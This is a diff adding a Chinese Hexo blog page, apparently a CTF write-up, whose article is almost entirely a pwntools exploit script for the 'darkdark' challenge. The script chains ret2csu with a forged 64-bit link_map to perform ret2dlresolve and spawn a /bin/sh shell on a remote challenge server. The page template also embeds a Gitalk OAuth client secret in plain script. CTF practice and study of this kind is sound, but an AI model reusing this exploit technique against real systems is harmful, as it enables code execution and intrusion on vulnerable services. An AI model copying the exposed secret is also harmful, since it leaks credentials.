@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html>
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+  <title>x64_dlresolve - 广莫之野</title>
+  <meta charset="UTF-8">
+  <meta name="description" content>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+
+  <link rel="shortcut icon" href="/home.png" type="image/png">
+  <meta name="description" content="64位程序不能用pwntools的ret2dlresolvepayload">
+<meta name="keywords" content="ctf,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="x64_dlresolve">
+<meta property="og:url" content="http://shiroinu.top/2021/10/15/x64-dlresolve/index.html">
+<meta property="og:site_name" content="广莫之野">
+<meta property="og:description" content="64位程序不能用pwntools的ret2dlresolvepayload">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2021-10-15T15:09:57.256Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="x64_dlresolve">
+<meta name="twitter:description" content="64位程序不能用pwntools的ret2dlresolvepayload">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
+   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
+  <link rel="stylesheet" href="/css/style.css?v=1637381239038">
+</head>
+
+<body class="mdui-drawer-body-left">
+  
+  <div id="nexmoe-background">
+    <div class="nexmoe-bg" style="background-image: url(/images/back1.png)"></div>
+    <div class="mdui-appbar mdui-shadow-0">
+      <div class="mdui-toolbar">
+        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
+        <div class="mdui-toolbar-spacer"></div>
+        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+        <a href="/" title="tsts" class="mdui-btn mdui-btn-icon"><img src="/images/head.png"></a>
+       </div>
+    </div>
+  </div>
+  <div id="nexmoe-header">
+      <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="tsts">
+            <img src="/images/head.png" alt="tsts">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>32</div>
+        <div><span>标签</span>3</div>
+        <div><span>分类</span>0</div>
+    </div>
+    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博客
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+    </ul>
+    <aside id="nexmoe-sidebar">
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">社交按钮</h3>
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://github.com/killthatshaman/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+  
+  
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">标签云</h3>
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud">
+      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/others/" style="font-size: 10px;">others</a> <a href="/tags/pwn/" style="font-size: 15px;">pwn</a>
+    </div>
+    
+  </div>
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">三月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2021 tsts
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+  </div>
+  <div id="nexmoe-content">
+    <div class="nexmoe-primary">
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+            <img src="/images/back1.png">
+        
+        <h1>x64_dlresolve</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2021年10月15日</a>
+    <a><i class="nexmoefont icon-areachart"></i>597 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 3 分钟</a>
+    
+    
+      <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
+    
+  </div>
+  <article>
+    <p>64位程序不能用pwntools的ret2dlresolvepayload</p>
+<a id="more"></a>
+
+<h1 id="2021年中国能源网络安全大赛-darkdark"><a href="#2021年中国能源网络安全大赛-darkdark" class="headerlink" title="2021年中国能源网络安全大赛 darkdark"></a>2021年中国能源网络安全大赛 darkdark</h1><pre><code class="python">from pwn import *
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]
+context.arch = &quot;amd64&quot;
+# io = process(&quot;./darkdark&quot;)
+io = remote(&#39;106.14.120.231&#39;,23485)
+elf = ELF(&quot;./darkdark&quot;)
+
+bss_addr = elf.bss()
+csu_front_addr = 0x4005B0
+csu_end_addr = 0x4005CA
+vuln_addr = 0x400537
+
+
+def csu(rbx, rbp, r12, r13, r14, r15):
+    # pop rbx, rbp, r12, r13, r14, r15
+    # rbx = 0
+    # rbp = 1, enable not to jump
+    # r12 should be the function that you want to call
+    # rdi = edi = r13d
+    # rsi = r14
+    # rdx = r15
+    payload = p64(csu_end_addr)
+    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
+    payload += p64(csu_front_addr)
+    payload += &#39;\x00&#39; * 0x38
+    return payload
+
+
+def ret2dlresolve_with_fakelinkmap_x64(elf, fake_linkmap_addr, known_function_ptr, offset_of_two_addr):
+    &#39;&#39;&#39;
+    elf: is the ELF object
+
+    fake_linkmap_addr: the address of the fake linkmap
+
+    known_function_ptr: a already known pointer of the function, e.g., elf.got[&#39;__libc_start_main&#39;]
+
+    offset_of_two_addr: target_function_addr - *(known_function_ptr), where
+                        target_function_addr is the function you want to execute
+
+    WARNING: assert *(known_function_ptr-8) &amp; 0x0000030000000000 != 0 as ELF64_ST_VISIBILITY(o) = o &amp; 0x3
+
+    WARNING: be careful that fake_linkmap is 0x100 bytes length   
+
+    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=0
+
+    linkmap:
+        0x00: l_addr = offset_of_two_addr
+      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x8
+        0x08: 17, tag of the JMPREL
+        0x10: fake_linkmap_addr + 0x18, pointer of the fake JMPREL
+      fake_JMPREL, addr = fake_linkmap_addr + 0x18
+        0x18: p_r_offset, offset pointer to the resloved addr
+        0x20: r_info
+        0x28: append
+      resolved addr
+        0x30: r_offset
+      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0x38
+        0x38: 6, tag of the DT_SYMTAB
+        0x40: known_function_ptr-8, p_fake_symbol_table
+      command that you want to execute for system
+        0x48: /bin/sh
+      P_DT_STRTAB, pointer for DT_STRTAB
+        0x68: fake a pointer, e.g., fake_linkmap_addr
+      p_DT_SYMTAB, pointer for fake_DT_SYMTAB
+        0x70: fake_linkmap_addr + 0x38
+      p_DT_JMPREL, pointer for fake_DT_JMPREL
+        0xf8: fake_linkmap_addr + 0x8
+    &#39;&#39;&#39;
+    plt0 = elf.get_section_by_name(&#39;.plt&#39;).header.sh_addr
+
+    linkmap = p64(offset_of_two_addr &amp; (2**64 - 1))
+    linkmap += p64(17) + p64(fake_linkmap_addr + 0x18)
+    # here we set p_r_offset = fake_linkmap_addr + 0x30 - two_offset
+    # as void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset) and l-&gt;l_addr = offset_of_two_addr
+    linkmap += p64((fake_linkmap_addr + 0x30 - offset_of_two_addr)
+                   &amp; (2**64 - 1)) + p64(0x7) + p64(0)
+    linkmap += p64(0)
+    linkmap += p64(6) + p64(known_function_ptr-8)
+    linkmap += &#39;/bin/sh\x00&#39;           # cmd offset 0x48
+    linkmap = linkmap.ljust(0x68, &#39;A&#39;)
+    linkmap += p64(fake_linkmap_addr)
+    linkmap += p64(fake_linkmap_addr + 0x38)
+    linkmap = linkmap.ljust(0xf8, &#39;A&#39;)
+    linkmap += p64(fake_linkmap_addr + 8)
+
+    resolve_call = p64(plt0+6) + p64(fake_linkmap_addr) + p64(0)
+    return (linkmap, resolve_call)
+
+
+# io.recvuntil(&#39;Welcome to XDCTF2015~!\n&#39;)
+# gdb.attach(io)
+
+fake_linkmap_addr = bss_addr+0x100
+
+# construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location
+rop = ROP(&quot;./darkdark&quot;)
+offset = 0x30+8
+rop.raw(offset*&#39;\x00&#39;)
+# libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+libc = ELF(&#39;./libc-2.27.so&#39;)
+link_map, resolve_call = ret2dlresolve_with_fakelinkmap_x64(elf,fake_linkmap_addr, elf.got[&#39;read&#39;],libc.sym[&#39;system&#39;]- libc.sym[&#39;read&#39;])
+rop.raw(csu(0, 1, elf.got[&#39;read&#39;], 0, fake_linkmap_addr, len(link_map)))
+rop.raw(vuln_addr)
+rop.raw(&quot;a&quot;*(256-len(rop.chain())))
+assert(len(rop.chain()) &lt;= 256)
+io.send(rop.chain())
+# send linkmap
+io.send(link_map)
+
+rop = ROP(&quot;./darkdark&quot;)
+rop.raw(offset*&#39;\x00&#39;)
+#0x00000000004005d1: pop rsi; pop r15; ret; 
+rop.raw(0x00000000004005d1)  # stack align 16 bytes
+rop.raw(0)
+rop.raw(0)
+rop.raw(0x00000000004005d3)  # 0x00000000004005d3: pop rdi; ret;
+rop.raw(fake_linkmap_addr + 0x48)
+rop.raw(resolve_call)
+io.send(rop.chain())
+io.interactive()</code></pre>
+
+  </article>
+  
+    
+
+  
+  <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '80b2453b6d5f37ad6225',
+        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
+        id: window.location.pathname,
+        repo: 'nexmoe.github.io',
+        owner: 'nexmoe',
+        admin: 'nexmoe'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+</div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+ 
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+ 
+    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script src="/js/app.js?v=1637381239048"></script>
+<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
+
+
+
+
+  
+
+
+
+
+
+</body>
+
+</html>
